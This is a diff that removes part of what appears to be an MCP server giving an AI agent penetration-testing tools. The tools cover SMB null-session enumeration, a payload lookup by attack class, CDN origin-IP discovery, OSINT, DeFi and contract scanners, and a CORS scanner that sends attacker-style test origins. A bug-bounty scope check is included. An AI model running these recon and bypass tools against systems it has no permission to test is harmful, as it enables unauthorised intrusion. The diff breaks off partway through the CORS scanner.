-    progress.update("Null session check")
-    rpcclient_cmd = ["rpcclient", "-U", "", "-N", target, "-c", "enumdomusers"]
-    rpc_result = run_command_advanced(rpcclient_cmd, timeout=30, trace=trace)
-    null_session = rpc_result["return_code"] == 0 and "user:" in rpc_result["stdout"].lower()
-
-    progress.update("Analysis")
-    output = {
-        "status": "success", "target": target,
-        "os_info": os_info, "shares": shares, "users": users[:50], "groups": groups[:50],
-        "password_policy": password_policy, "null_session_possible": null_session,
-        "smb_output_preview": smb_result["stdout"][:1500],
-        "raw_output_preview": result["stdout"][:3000],
-        "severity": "HIGH" if null_session or shares else "info"
-    }
-
-    progress.update("Complete")
-    output = chain_engine.enrich_with_context("enum4linux_scan", target, output)
-    log_tool_execution("enum4linux_scan", target, inputs, output, trace, progress)
-    return json.dumps(output, indent=2)
-
-
-# ============================================================================
-# UTILITY TOOLS
-# ============================================================================
-
-@mcp.tool()
-@resolve_references
-async def get_payloads(
-    category: str = "all",
-    search: str = ""
-) -> str:
-    """
-    Retrieve penetration testing payloads. Categories: xss, sqli, lfi, rce, ssti, xxe, ssrf, auth_bypass, headers, all.
-    """
-    target = f"payloads_{category}"
-    trace, progress, exec_dir = _init_tool_context("get_payloads", target, 3)
-    inputs = {"category": category, "search": search}
-
-    progress.update("Loading payloads")
-    payloads = PayloadGenerator.get_payloads(category)
-
-    progress.update("Filtering")
-    if search:
-        search_lower = search.lower()
-        payloads = {k: [p for p in v if search_lower in p.lower()] for k, v in payloads.items()}
-        payloads = {k: v for k, v in payloads.items() if v}
-
-    total = sum(len(v) for v in payloads.values())
-    output = {
-        "status": "success", "category": category, "search_filter": search,
-        "total_payloads": total,
-        "payloads": {k: v[:50] for k, v in payloads.items()},
-        "categories_available": ["xss", "sqli", "lfi", "rce", "ssti", "xxe", "ssrf", "auth_bypass", "headers"]
-    }
-
-    progress.update("Complete")
-    log_tool_execution("get_payloads", target, inputs, output, trace, progress)
-    return json.dumps(output, indent=2)
-
-
-@mcp.tool()
-@resolve_references
-async def web_tech_detect(
-    target: str,
-    timeout: int = 60
-) -> str:
-    """
-    Detect web technologies, frameworks, CMS, servers, and libraries using multiple methods (headers, whatweb, wappalyzer patterns).
-    """
-    target = InputValidator.sanitize_target(target)
-    trace, progress, exec_dir = _init_tool_context("web_tech_detect", target, 6)
-    url = target if target.startswith("http") else f"http://{target}"
-    inputs = {"target": url}
-
-    progress.update("HTTP header analysis")
-    curl_cmd = ["curl", "-sI", "-k", "--max-time", "15", "-L", url]
-    curl_result = run_command_advanced(curl_cmd, timeout=20, trace=trace)
-    headers_info = {}
-    for line in curl_result["stdout"].split("\n"):
-        if ":" in line:
-            k, _, v = line.partition(":")
-            headers_info[k.strip().lower()] = v.strip()
-
-    detected_tech = []
-    server = headers_info.get("server", "")
-    if server:
-        detected_tech.append({"name": "Server", "value": server, "source": "headers"})
-    powered = headers_info.get("x-powered-by", "")
-    if powered:
-        detected_tech.append({"name": "X-Powered-By", "value": powered, "source": "headers"})
-
-    progress.update("WhatWeb scan")
-    whatweb_cmd = ["whatweb", "--color=never", "-v", url]
-    whatweb_result = run_command_advanced(whatweb_cmd, timeout=30, trace=trace)
-    whatweb_entries = []
-    for line in whatweb_result["stdout"].split("\n"):
-        if line.strip() and not line.startswith("http"):
-            whatweb_entries.append(line.strip())
-
-    progress.update("Body content analysis")
-    body_cmd = ["curl", "-sk", "--max-time", "15", "-L", url]
-    body_result = run_command_advanced(body_cmd, timeout=20, trace=trace)
-    body_lower = body_result["stdout"].lower()
-
-    tech_signatures = {
-        "WordPress": ["wp-content", "wp-includes", "wordpress"],
-        "Joomla": ["joomla", "/media/system/js/", "com_content"],
-        "Drupal": ["drupal", "sites/default/files", "misc/drupal.js"],
-        "React": ["react", "_react", "react-dom", "__NEXT_DATA__"],
-        "Angular": ["ng-version", "angular", "ng-app"],
-        "Vue.js": ["vue.js", "vue.min.js", "__vue__", "vue-router"],
-        "jQuery": ["jquery", "jquery.min.js"],
-        "Bootstrap": ["bootstrap", "bootstrap.min.css"],
-        "Laravel": ["laravel", "csrf-token"],
-        "Django": ["csrfmiddlewaretoken", "django"],
-        "Express": ["express", "x-powered-by: express"],
-        "Nginx": ["nginx"],
-        "Apache": ["apache"],
-        "PHP": [".php", "phpsessid"],
-        "ASP.NET": ["asp.net", "__viewstate", ".aspx"],
-        "Ruby on Rails": ["rails", "ruby on rails"],
-        "Next.js": ["_next/", "__next"],
-        "Nuxt.js": ["__nuxt", "_nuxt/"],
-        "Cloudflare": ["cloudflare", "cf-ray"],
-        "AWS": ["amazonaws", "x-amz"],
-        "Shopify": ["shopify", "cdn.shopify.com"],
-        "Magento": ["magento", "mage/"],
-        "Wix": ["wix.com", "wixstatic"]
-    }
-    for tech, sigs in tech_signatures.items():
-        for sig in sigs:
-            if sig in body_lower:
-                detected_tech.append({"name": tech, "confidence": "medium", "source": "body_analysis"})
-                break
-
-    progress.update("Cookie analysis")
-    cookies = headers_info.get("set-cookie", "")
-    cookie_tech = []
-    cookie_map = {"phpsessid": "PHP", "jsessionid": "Java", "asp.net_sessionid": "ASP.NET",
-                  "laravel_session": "Laravel", "_csrf": "Node.js/Express", "connect.sid": "Express",
-                  "django": "Django", "rack.session": "Ruby/Rack"}
-    for sig, tech in cookie_map.items():
-        if sig in cookies.lower():
-            cookie_tech.append(tech)
-            detected_tech.append({"name": tech, "confidence": "high", "source": "cookies"})
-
-    progress.update("Analysis")
-    unique_tech = {}
-    for t in detected_tech:
-        name = t["name"]
-        if name not in unique_tech or t.get("confidence", "low") == "high":
-            unique_tech[name] = t
-    detected_tech = list(unique_tech.values())
-
-    output = {
-        "status": "success", "target": url,
-        "technologies_detected": len(detected_tech),
-        "technologies": detected_tech,
-        "headers": headers_info,
-        "whatweb_output": whatweb_entries[:30],
-        "cookies_analysis": cookie_tech,
-        "security_headers": {
-            "x_frame_options": headers_info.get("x-frame-options", "MISSING"),
-            "content_security_policy": headers_info.get("content-security-policy", "MISSING"),
-            "strict_transport_security": headers_info.get("strict-transport-security", "MISSING"),
-            "x_content_type_options": headers_info.get("x-content-type-options", "MISSING"),
-            "x_xss_protection": headers_info.get("x-xss-protection", "MISSING")
-        }
-    }
-
-    progress.update("Complete")
-    output = chain_engine.enrich_with_context("web_tech_detect", target, output)
-    log_tool_execution("web_tech_detect", target, inputs, output, trace, progress)
-    return json.dumps(output, indent=2)
-
-
-# ============================================================================
-# BUG BOUNTY TOOLS
-# ============================================================================
-
-@mcp.tool()
-@resolve_references
-async def scope_check(
-    target: str,
-    program_url: str = "",
-    platform: str = "hackerone",
-    in_scope_domains: str = "",
-    out_of_scope_patterns: str = ""
-) -> str:
-    """
-    Bug bounty scope verification. Checks if target is within program scope.
-    Platforms: hackerone, bugcrowd, intigriti, immunefi.
-    """
-    target = InputValidator.sanitize_target(target)
-    trace, progress, exec_dir = _init_tool_context("scope_check", target, 5)
-    inputs = {"target": target, "platform": platform, "program_url": program_url}
-
-    progress.update("Parsing scope rules")
-    in_scope = [d.strip() for d in in_scope_domains.split(",") if d.strip()] if in_scope_domains else []
-    out_scope = [p.strip() for p in out_of_scope_patterns.split(",") if p.strip()] if out_of_scope_patterns else []
-
-    progress.update("Checking scope")
-    is_in_scope = False
-    scope_reason = ""
-    target_domain = target.replace("http://", "").replace("https://", "").split("/")[0].split(":")[0]
-
-    if in_scope:
-        for domain in in_scope:
-            if target_domain == domain or target_domain.endswith("." + domain):
-                is_in_scope = True
-                scope_reason = f"Matches in-scope domain: {domain}"
-                break
-        if not is_in_scope:
-            scope_reason = "Target not in provided scope domains"
-    else:
-        is_in_scope = True
-        scope_reason = "No scope domains specified - manual verification required"
-
-    for pattern in out_scope:
-        if pattern in target_domain:
-            is_in_scope = False
-            scope_reason = f"Matches out-of-scope pattern: {pattern}"
-            break
-
-    progress.update("Resolving target info")
-    try:
-        ip = socket.gethostbyname(target_domain)
-    except Exception:
-        ip = "unresolved"
-
-    progress.update("Platform info")
-    platform_info = {
-        "hackerone": {"report_url": "https://hackerone.com/reports/new", "format": "Markdown",
-                     "severity_rating": "CVSS 3.0", "min_bounty_typical": "$100"},
-        "bugcrowd": {"report_url": "https://bugcrowd.com/", "format": "Markdown",
-                    "severity_rating": "P1-P5", "min_bounty_typical": "$150"},
-        "intigriti": {"report_url": "https://app.intigriti.com/", "format": "Rich Text",
-                     "severity_rating": "CVSS 3.1", "min_bounty_typical": "€100"},
-        "immunefi": {"report_url": "https://immunefi.com/", "format": "Markdown",
-                    "severity_rating": "Impact-based", "min_bounty_typical": "$1000",
-                    "focus": "Smart Contracts / DeFi / Blockchain"}
-    }
-
-    output = {
-        "status": "success", "target": target, "target_domain": target_domain, "ip": ip,
-        "in_scope": is_in_scope, "scope_reason": scope_reason,
-        "platform": platform,
-        "platform_info": platform_info.get(platform, {}),
-        "in_scope_domains": in_scope, "out_of_scope_patterns": out_scope,
-        "recommendation": "PROCEED with testing" if is_in_scope else "DO NOT TEST - out of scope"
-    }
-
-    progress.update("Complete")
-    output = chain_engine.enrich_with_context("scope_check", target, output)
-    log_tool_execution("scope_check", target, inputs, output, trace, progress)
-    return json.dumps(output, indent=2)
-
-
-@mcp.tool()
-@resolve_references
-async def generate_report(
-    target: str,
-    title: str = "Security Assessment Report",
-    report_format: str = "markdown",
-    include_chain_data: bool = True,
-    severity_filter: str = ""
-) -> str:
-    """
-    Generate comprehensive penetration testing report from chain data.
-    Aggregates all tool results for a target into a structured report.
-    Formats: markdown, json, html.
-    """
-    target = InputValidator.sanitize_target(target)
-    trace, progress, exec_dir = _init_tool_context("generate_report", target, 6)
-    inputs = {"target": target, "title": title, "format": report_format}
-
-    progress.update("Gathering chain data")
-    chain_data = chain_engine.get_related_results(target)
-    chain_summary = chain_engine.get_chain_summary(target)
-
-    progress.update("Categorizing findings")
-    findings = {"critical": [], "high": [], "medium": [], "low": [], "info": []}
-    for tool_name, results in chain_data.items():
-        for result in (results if isinstance(results, list) else [results]):
-            if not isinstance(result, dict):
-                continue
-            sev = result.get("severity", "info").lower()
-            if sev in ["critical", "high", "medium", "low", "info"]:
-                findings[sev].append({"tool": tool_name, "data": _truncate_dict(result, 500)})
-
-    if severity_filter:
-        allowed = [s.strip().lower() for s in severity_filter.split(",")]
-        findings = {k: v for k, v in findings.items() if k in allowed}
-
-    progress.update("Building executive summary")
-    total_findings = sum(len(v) for v in findings.values())
-    exec_summary = {
-        "target": target,
-        "assessment_date": generate_timestamp(),
-        "tools_used": list(chain_data.keys()),
-        "total_findings": total_findings,
-        "severity_breakdown": {k: len(v) for k, v in findings.items()},
-        "overall_risk": "CRITICAL" if findings.get("critical") else
-                       ("HIGH" if findings.get("high") else
-                        ("MEDIUM" if findings.get("medium") else "LOW"))
-    }
-
-    progress.update("Generating report body")
-    if report_format == "markdown":
-        md_lines = [f"# {title}", f"\n**Target:** {target}",
-                   f"**Date:** {exec_summary['assessment_date']}",
-                   f"**Overall Risk:** {exec_summary['overall_risk']}", "",
-                   "## Executive Summary", f"- Tools used: {len(exec_summary['tools_used'])}",
-                   f"- Total findings: {total_findings}"]
-        for sev in ["critical", "high", "medium", "low", "info"]:
-            md_lines.append(f"- {sev.upper()}: {len(findings.get(sev, []))}")
-        md_lines.append("\n## Detailed Findings")
-        for sev in ["critical", "high", "medium", "low"]:
-            for f in findings.get(sev, []):
-                md_lines.append(f"\n### [{sev.upper()}] {f['tool']}")
-                md_lines.append(f"```json\n{json.dumps(f['data'], indent=2)[:1000]}\n```")
-        md_lines.append("\n## Recommendations")
-        if findings.get("critical"):
-            md_lines.append("1. **IMMEDIATE ACTION REQUIRED** - Address critical findings before production deployment")
-        if findings.get("high"):
-            md_lines.append("2. **HIGH PRIORITY** - Remediate high severity issues within 7 days")
-        report_body = "\n".join(md_lines)
-
-        report_file = os.path.join(exec_dir, "report.md")
-        with open(report_file, "w") as f:
-            f.write(report_body)
-    else:
-        report_body = None
-        report_file = os.path.join(exec_dir, "report.json")
-
-    progress.update("Analysis")
-    output = {
-        "status": "success", "target": target, "title": title, "format": report_format,
-        "executive_summary": exec_summary,
-        "findings": {k: v[:10] for k, v in findings.items()},
-        "chain_summary": chain_summary,
-        "report_file": report_file,
-        "report_preview": report_body[:3000] if report_body else json.dumps(findings, indent=2)[:3000]
-    }
-
-    progress.update("Complete")
-    log_tool_execution("generate_report", target, inputs, output, trace, progress)
-    return json.dumps(output, indent=2)
-
-
-# ============================================================================
-# CRYPTO / DEFI / BLOCKCHAIN TOOLS
-# ============================================================================
-
-@mcp.tool()
-@resolve_references
-async def smart_contract_audit(
-    contract_address: str = "",
-    source_code: str = "",
-    chain: str = "ethereum",
-    timeout: int = 120
-) -> str:
-    """
-    Smart contract security audit. Detects reentrancy, integer overflow, access control, and common Solidity vulnerabilities.
-    """
-    target = contract_address or "source_audit"
-    trace, progress, exec_dir = _init_tool_context("smart_contract_audit", target, 6)
-    inputs = {"contract_address": contract_address, "chain": chain, "has_source": bool(source_code)}
-
-    progress.update("Preparing analysis")
-    vulnerabilities = []
-
-    if source_code:
-        progress.update("Static analysis of source code")
-        vuln_patterns = {
-            "reentrancy": [r'\.call\{value:', r'\.call\.value\(', r'\.send\(', r'\.transfer\('],
-            "integer_overflow": [r'SafeMath', r'\+\+', r'\-\-', r'\*\s*\d+'],
-            "unchecked_return": [r'\.call\(', r'\.send\(', r'\.delegatecall\('],
-            "tx_origin": [r'tx\.origin'],
-            "selfdestruct": [r'selfdestruct\(', r'suicide\('],
-            "delegatecall": [r'\.delegatecall\('],
-            "timestamp_dependence": [r'block\.timestamp', r'now\b'],
-            "access_control": [r'onlyOwner', r'require\(msg\.sender'],
-            "front_running": [r'block\.number', r'blockhash'],
-            "dos_gas_limit": [r'for\s*\(', r'while\s*\(']
-        }
-        for vuln_type, patterns in vuln_patterns.items():
-            for pattern in patterns:
-                matches = re.findall(pattern, source_code)
-                if matches:
-                    vulnerabilities.append({
-                        "type": vuln_type, "severity": "HIGH" if vuln_type in ["reentrancy", "selfdestruct", "delegatecall"] else "MEDIUM",
-                        "matches": len(matches), "pattern": pattern,
-                        "description": f"Potential {vuln_type.replace('_', ' ')} vulnerability detected"
-                    })
-
-        slither_check = run_command_advanced(["which", "slither"], timeout=10, trace=trace)
-        if slither_check["return_code"] == 0:
-            sol_file = os.path.join(exec_dir, "contract.sol")
-            with open(sol_file, "w") as f:
-                f.write(source_code)
-            progress.update("Running Slither")
-            slither_cmd = ["slither", sol_file, "--json", os.path.join(exec_dir, "slither.json")]
-            run_command_advanced(slither_cmd, timeout=timeout, trace=trace)
-
-    if contract_address:
-        progress.update("Fetching on-chain data")
-        chain_apis = {
-            "ethereum": f"https://api.etherscan.io/api?module=contract&action=getsourcecode&address={contract_address}",
-            "bsc": f"https://api.bscscan.com/api?module=contract&action=getsourcecode&address={contract_address}",
-            "polygon": f"https://api.polygonscan.com/api?module=contract&action=getsourcecode&address={contract_address}"
-        }
-        api_url = chain_apis.get(chain, chain_apis["ethereum"])
-        api_cmd = ["curl", "-s", "--max-time", "15", api_url]
-        api_result = run_command_advanced(api_cmd, timeout=20, trace=trace)
-        try:
-            api_data = json.loads(api_result["stdout"])
-            if api_data.get("result") and isinstance(api_data["result"], list):
-                contract_info = api_data["result"][0]
-                if contract_info.get("SourceCode"):
-                    progress.update("Analyzing on-chain source")
-        except Exception:
-            pass
-
-    progress.update("Analysis")
-    critical_vulns = [v for v in vulnerabilities if v.get("severity") == "HIGH"]
-    output = {
-        "status": "success", "target": target, "chain": chain,
-        "vulnerabilities_found": len(vulnerabilities),
-        "critical_count": len(critical_vulns),
-        "vulnerabilities": vulnerabilities,
-        "risk_score": min(10, len(critical_vulns) * 3 + (len(vulnerabilities) - len(critical_vulns))),
-        "recommendations": [
-            "Use OpenZeppelin SafeMath or Solidity 0.8+ for arithmetic",
-            "Implement checks-effects-interactions pattern for reentrancy",
-            "Use access control modifiers consistently",
-            "Avoid tx.origin for authorization",
-            "Add emergency pause functionality"
-        ] if vulnerabilities else ["No critical issues detected in static analysis"],
-        "severity": "CRITICAL" if len(critical_vulns) > 2 else ("HIGH" if critical_vulns else "info")
-    }
-
-    progress.update("Complete")
-    output = chain_engine.enrich_with_context("smart_contract_audit", target, output)
-    log_tool_execution("smart_contract_audit", target, inputs, output, trace, progress)
-    return json.dumps(output, indent=2)
-
-
-@mcp.tool()
-@resolve_references
-async def defi_protocol_scan(
-    protocol_url: str = "",
-    contract_address: str = "",
-    chain: str = "ethereum",
-    timeout: int = 120
-) -> str:
-    """
-    DeFi protocol security scan. Checks for flash loan vulnerabilities, oracle manipulation, governance attacks, and rug pull indicators.
-    """
-    target = protocol_url or contract_address or "unknown"
-    trace, progress, exec_dir = _init_tool_context("defi_protocol_scan", target, 6)
-    inputs = {"protocol_url": protocol_url, "contract_address": contract_address, "chain": chain}
-
-    progress.update("Checking protocol info")
-    defi_risks = []
-
-    if protocol_url:
-        progress.update("Scanning web frontend")
-        url = protocol_url if protocol_url.startswith("http") else f"https://{protocol_url}"
-        curl_cmd = ["curl", "-sk", "--max-time", "15", url]
-        web_result = run_command_advanced(curl_cmd, timeout=20, trace=trace)
-        body = web_result["stdout"].lower()
-
-        risk_indicators = {
-            "unlimited_approval": ["approve", "unlimited", "max_uint", "type(uint256).max"],
-            "no_timelock": ["timelock" not in body and "governance" in body],
-            "centralized_admin": ["owner", "admin", "setfee", "setprice", "withdraw"],
-            "no_audit_mentioned": ["audit" not in body],
-            "suspicious_tokenomics": ["100% tax", "honeypot", "blacklist"]
-        }
-        for risk, indicators in risk_indicators.items():
-            if isinstance(indicators[0], bool):
-                if indicators[0]:
-                    defi_risks.append({"type": risk, "severity": "MEDIUM", "source": "frontend"})
-            else:
-                for ind in indicators:
-                    if ind in body:
-                        defi_risks.append({"type": risk, "severity": "HIGH", "indicator": ind, "source": "frontend"})
-                        break
-
-    progress.update("Common DeFi attack vectors")
-    attack_vectors = [
-        {"name": "Flash Loan Attack", "description": "Borrow large amounts to manipulate price/state", "severity": "CRITICAL"},
-        {"name": "Oracle Manipulation", "description": "Manipulate price feeds via low liquidity pools", "severity": "CRITICAL"},
-        {"name": "Governance Attack", "description": "Acquire voting power to pass malicious proposals", "severity": "HIGH"},
-        {"name": "Rug Pull", "description": "Developer removes liquidity or mints tokens", "severity": "CRITICAL"},
-        {"name": "Sandwich Attack", "description": "Front-run and back-run user transactions", "severity": "MEDIUM"},
-        {"name": "Impermanent Loss Exploit", "description": "Manipulate pool ratios", "severity": "MEDIUM"}
-    ]
-
-    progress.update("Token contract checks")
-    if contract_address:
-        token_cmd = ["curl", "-s", "--max-time", "15",
-                    f"https://api.etherscan.io/api?module=contract&action=getsourcecode&address={contract_address}"]
-        token_result = run_command_advanced(token_cmd, timeout=20, trace=trace)
-
-    progress.update("Analysis")
-    output = {
-        "status": "success", "target": target, "chain": chain,
-        "risks_identified": len(defi_risks), "risks": defi_risks,
-        "common_attack_vectors": attack_vectors,
-        "recommendations": [
-            "Verify audit reports from reputable firms (Trail of Bits, OpenZeppelin, Certik)",
-            "Check contract verification on block explorer",
-            "Verify timelock on admin functions",
-            "Check token approval amounts before interacting",
-            "Review governance token distribution and voting thresholds",
-            "Test with small amounts first"
-        ],
-        "severity": "HIGH" if defi_risks else "info"
-    }
-
-    progress.update("Complete")
-    output = chain_engine.enrich_with_context("defi_protocol_scan", target, output)
-    log_tool_execution("defi_protocol_scan", target, inputs, output, trace, progress)
-    return json.dumps(output, indent=2)
-
-
-@mcp.tool()
-@resolve_references
-async def blockchain_tx_analyzer(
-    tx_hash: str = "",
-    address: str = "",
-    chain: str = "ethereum",
-    timeout: int = 60
-) -> str:
-    """
-    Blockchain transaction analysis. Traces fund flows, identifies suspicious patterns, analyzes gas usage and contract interactions.
-    """
-    target = tx_hash or address or "unknown"
-    trace, progress, exec_dir = _init_tool_context("blockchain_tx_analyzer", target, 5)
-    inputs = {"tx_hash": tx_hash, "address": address, "chain": chain}
-
-    progress.update("Querying blockchain API")
-    explorers = {
-        "ethereum": "https://api.etherscan.io/api",
-        "bsc": "https://api.bscscan.com/api",
-        "polygon": "https://api.polygonscan.com/api"
-    }
-    base_api = explorers.get(chain, explorers["ethereum"])
-    results = {}
-
-    if tx_hash:
-        tx_cmd = ["curl", "-s", "--max-time", "15",
-                 f"{base_api}?module=proxy&action=eth_getTransactionByHash&txhash={tx_hash}"]
-        tx_result = run_command_advanced(tx_cmd, timeout=20, trace=trace)
-        try:
-            results["transaction"] = json.loads(tx_result["stdout"])
-        except Exception:
-            results["transaction"] = {"raw": tx_result["stdout"][:2000]}
-
-    if address:
-        progress.update("Analyzing address")
-        bal_cmd = ["curl", "-s", "--max-time", "15",
-                  f"{base_api}?module=account&action=balance&address={address}"]
-        bal_result = run_command_advanced(bal_cmd, timeout=20, trace=trace)
-        try:
-            results["balance"] = json.loads(bal_result["stdout"])
-        except Exception:
-            pass
-
-        txlist_cmd = ["curl", "-s", "--max-time", "15",
-                     f"{base_api}?module=account&action=txlist&address={address}&startblock=0&endblock=99999999&page=1&offset=10&sort=desc"]
-        txlist_result = run_command_advanced(txlist_cmd, timeout=20, trace=trace)
-        try:
-            results["recent_transactions"] = json.loads(txlist_result["stdout"])
-        except Exception:
-            pass
-
-    progress.update("Pattern analysis")
-    suspicious_patterns = []
-    tx_data = results.get("transaction", {}).get("result", {})
-    if isinstance(tx_data, dict):
-        gas = int(tx_data.get("gas", "0x0"), 16) if tx_data.get("gas") else 0
-        value = int(tx_data.get("value", "0x0"), 16) if tx_data.get("value") else 0
-        if gas > 500000:
-            suspicious_patterns.append({"type": "high_gas", "value": gas, "severity": "MEDIUM"})
-        if value > 10**20:
-            suspicious_patterns.append({"type": "large_transfer", "value_eth": value / 10**18, "severity": "HIGH"})
-
-    progress.update("Analysis")
-    output = {
-        "status": "success", "target": target, "chain": chain,
-        "data": results,
-        "suspicious_patterns": suspicious_patterns,
-        "severity": "HIGH" if suspicious_patterns else "info"
-    }
-
-    progress.update("Complete")
-    output = chain_engine.enrich_with_context("blockchain_tx_analyzer", target, output)
-    log_tool_execution("blockchain_tx_analyzer", target, inputs, output, trace, progress)
-    return json.dumps(output, indent=2)
-
-
-# ============================================================================
-# OSINT TOOLS
-# ============================================================================
-
-@mcp.tool()
-@resolve_references
-async def origin_ip_hunter(
-    target: str,
-    methods: str = "all",
-    timeout: int = 120
-) -> str:
-    """
-    Discover origin IP behind CDN/WAF (Cloudflare, Akamai, etc.) using DNS history, certificate transparency, and direct probing.
-    """
-    target = InputValidator.sanitize_target(target)
-    trace, progress, exec_dir = _init_tool_context("origin_ip_hunter", target, 7)
-    inputs = {"target": target, "methods": methods}
-
-    found_ips = {}
-
-    progress.update("Current DNS resolution")
-    try:
-        current_ip = socket.gethostbyname(target)
-        found_ips["current_dns"] = [current_ip]
-    except Exception:
-        current_ip = None
-
-    progress.update("SecurityTrails DNS history")
-    hist_cmd = ["curl", "-s", "--max-time", "15",
-               f"https://api.securitytrails.com/v1/history/{target}/dns/a"]
-    hist_result = run_command_advanced(hist_cmd, timeout=20, trace=trace)
-
-    progress.update("Certificate search (crt.sh)")
-    crt_cmd = ["curl", "-s", "--max-time", "20",
-              f"https://crt.sh/?q={target}&output=json"]
-    crt_result = run_command_advanced(crt_cmd, timeout=25, trace=trace)
-
-    progress.update("Direct IP connection probing")
-    common_subdomains = ["mail", "ftp", "cpanel", "webmail", "direct", "origin",
-                        "old", "legacy", "dev", "staging", "test", "api"]
-    for sub in common_subdomains:
-        fqdn = f"{sub}.{target}"
-        try:
-            ip = socket.gethostbyname(fqdn)
-            if ip != current_ip:
-                found_ips.setdefault("subdomain_leak", []).append({"subdomain": fqdn, "ip": ip})
-        except Exception:
-            pass
-
-    progress.update("MX/SPF record check")
-    mx_cmd = ["dig", "+short", target, "MX"]
-    mx_result = run_command_advanced(mx_cmd, timeout=10, trace=trace)
-    spf_cmd = ["dig", "+short", target, "TXT"]
-    spf_result = run_command_advanced(spf_cmd, timeout=10, trace=trace)
-
-    mx_ips = []
-    for line in mx_result["stdout"].split("\n"):
-        parts = line.split()
-        if len(parts) >= 2:
-            mx_host = parts[-1].rstrip(".")
-            try:
-                mx_ip = socket.gethostbyname(mx_host)
-                mx_ips.append({"mx_host": mx_host, "ip": mx_ip})
-            except Exception:
-                pass
-    if mx_ips:
-        found_ips["mx_records"] = mx_ips
-
-    spf_ips = re.findall(r'ip4:(\d+\.\d+\.\d+\.\d+)', spf_result["stdout"])
-    if spf_ips:
-        found_ips["spf_records"] = spf_ips
-
-    progress.update("Analysis")
-    all_candidate_ips = set()
-    for method, ips in found_ips.items():
-        if isinstance(ips, list):
-            for ip in ips:
-                if isinstance(ip, dict):
-                    all_candidate_ips.add(ip.get("ip", ""))
-                else:
-                    all_candidate_ips.add(ip)
-    all_candidate_ips.discard("")
-    all_candidate_ips.discard(current_ip)
-
-    output = {
-        "status": "success", "target": target,
-        "current_ip": current_ip,
-        "candidate_origin_ips": sorted(all_candidate_ips),
-        "methods_results": found_ips,
-        "spf_text": spf_result["stdout"][:500],
-        "total_candidates": len(all_candidate_ips),
-        "severity": "HIGH" if all_candidate_ips else "info"
-    }
-
-    progress.update("Complete")
-    output = chain_engine.enrich_with_context("origin_ip_hunter", target, output)
-    log_tool_execution("origin_ip_hunter", target, inputs, output, trace, progress)
-    return json.dumps(output, indent=2)
-
-
-@mcp.tool()
-@resolve_references
-async def osint_domain_intel(
-    target: str,
-    depth: str = "standard",
-    timeout: int = 120
-) -> str:
-    """
-    OSINT domain intelligence gathering. Combines WHOIS, DNS, technology detection, SSL certificate analysis, and social media presence.
-    """
-    target = InputValidator.sanitize_target(target)
-    trace, progress, exec_dir = _init_tool_context("osint_domain_intel", target, 7)
-    inputs = {"target": target, "depth": depth}
-
-    intel = {}
-
-    progress.update("WHOIS lookup")
-    whois_result = run_command_advanced(["whois", target], timeout=30, trace=trace)
-    whois_data = {}
-    for line in whois_result["stdout"].split("\n"):
-        if ":" in line and not line.strip().startswith("%"):
-            k, _, v = line.partition(":")
-            k, v = k.strip(), v.strip()
-            if k and v and len(k) < 50:
-                whois_data[k] = v
-    intel["whois"] = whois_data
-
-    progress.update("DNS records")
-    dns_data = {}
-    for rtype in ["A", "AAAA", "MX", "NS", "TXT", "SOA"]:
-        r = run_command_advanced(["dig", "+short", target, rtype], timeout=10, trace=trace)
-        records = [l.strip() for l in r["stdout"].split("\n") if l.strip()]
-        if records:
-            dns_data[rtype] = records
-    intel["dns"] = dns_data
-
-    progress.update("SSL certificate analysis")
-    ssl_cmd = ["openssl", "s_client", "-connect", f"{target}:443", "-servername", target]
-    ssl_result = run_command_advanced(ssl_cmd, timeout=15, trace=trace)
-    ssl_info = {}
-    for line in ssl_result["stdout"].split("\n"):
-        for key in ["subject=", "issuer=", "notBefore=", "notAfter="]:
-            if line.strip().startswith(key) or f" {key}" in line:
-                ssl_info[key.rstrip("=")] = line.split(key)[-1].strip()
-    intel["ssl"] = ssl_info
-
-    progress.update("HTTP technology fingerprint")
-    curl_cmd = ["curl", "-sI", "-k", "--max-time", "10", f"https://{target}"]
-    curl_result = run_command_advanced(curl_cmd, timeout=15, trace=trace)
-    headers = {}
-    for line in curl_result["stdout"].split("\n"):
-        if ":" in line:
-            k, _, v = line.partition(":")
-            headers[k.strip().lower()] = v.strip()
-    intel["http_headers"] = headers
-
-    if depth == "deep":
-        progress.update("Deep OSINT")
-        robots_cmd = ["curl", "-sk", "--max-time", "10", f"https://{target}/robots.txt"]
-        robots_result = run_command_advanced(robots_cmd, timeout=15, trace=trace)
-        intel["robots_txt"] = robots_result["stdout"][:2000]
-
-        sitemap_cmd = ["curl", "-sk", "--max-time", "10", f"https://{target}/sitemap.xml"]
-        sitemap_result = run_command_advanced(sitemap_cmd, timeout=15, trace=trace)
-        intel["sitemap"] = sitemap_result["stdout"][:2000]
-
-    progress.update("Analysis")
-    output = {
-        "status": "success", "target": target, "depth": depth,
-        "intelligence": intel,
-        "summary": {
-            "registrar": whois_data.get("Registrar", "unknown"),
-            "nameservers": dns_data.get("NS", []),
-            "mail_servers": dns_data.get("MX", []),
-            "ip_addresses": dns_data.get("A", []),
-            "server": headers.get("server", "unknown"),
-            "ssl_issuer": ssl_info.get("issuer", "unknown")
-        }
-    }
-
-    progress.update("Complete")
-    output = chain_engine.enrich_with_context("osint_domain_intel", target, output)
-    log_tool_execution("osint_domain_intel", target, inputs, output, trace, progress)
-    return json.dumps(output, indent=2)
-
-
-# ============================================================================
-# SECURITY SCANNER TOOLS
-# ============================================================================
-
-@mcp.tool()
-@resolve_references
-async def cors_scanner(
-    target: str,
-    origins_to_test: str = "",
-    timeout: int = 60
-) -> str:
-    """
-    CORS misconfiguration scanner. Tests for wildcard origins, null origin, credential reflection, and subdomain trust.
-    """
-    target = InputValidator.sanitize_target(target)
-    trace, progress, exec_dir = _init_tool_context("cors_scanner", target, 5)
-    url = target if target.startswith("http") else f"https://{target}"
-    inputs = {"target": url}
-
-    progress.update("Testing CORS origins")
-    domain = target.replace("http://", "").replace("https://", "").split("/")[0].split(":")[0]
-    test_origins = [
-        f"https://evil-{domain}", "https://attacker.com", "null",
-        f"https://{domain}.attacker.com", f"https://sub.{domain}",
-        f"http://{domain}", "https://localhost", f"https://{domain}%60.attacker.com",
-        f"https://{domain}_.attacker.com"
-    ]
-    if origins_to_test:
-        test_origins.extend([o.strip() for o in origins_to_test.split(",") if o.strip()])
-
-    results = []
-    for origin in test_origins:
-        cmd = ["curl", "-sI", "-k", "--max-time", "10", "-H", f"Origin: {origin}", url]
-        r = run_command_advanced(cmd, timeout=15, trace=trace)
-        acao = ""
-        acac = ""
-        for line in r["stdout"].split("\n"):
-            ll = line.lower()
-            if "access-control-allow-origin" in ll:
